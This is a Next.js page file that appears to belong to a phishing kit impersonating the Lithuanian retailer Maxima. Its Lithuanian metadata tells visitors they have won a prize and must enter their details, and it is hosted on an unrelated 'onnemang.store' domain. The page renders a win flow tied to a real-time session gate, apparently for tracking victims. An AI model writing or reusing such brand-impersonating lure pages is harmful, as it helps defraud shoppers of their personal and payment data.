import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { WinFlow } from "@/components/demo/WinFlow";
import { resolveServerSessionIdentity } from "@/lib/session-id";

export const dynamic = "force-dynamic";

export const metadata = {
  title: "Maxima — Jūs laimėjote!",
  description:
    "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
  icons: {
    icon: "/favicon.ico",
  },
  openGraph: {
    type: "website",
    locale: "lt_LT",
    url: "https://maxima.onnemang.store",
    siteName: "Maxima Laimės Ratas",
    title: "Maxima — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    images: [
      {
        url: "/og-image.jpg",
        width: 1200,
        height: 630,
        alt: "Maxima Laimės Ratas",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Maxima — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    images: ["/og-image.jpg"],
  },
};

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WinPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WinFlow sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
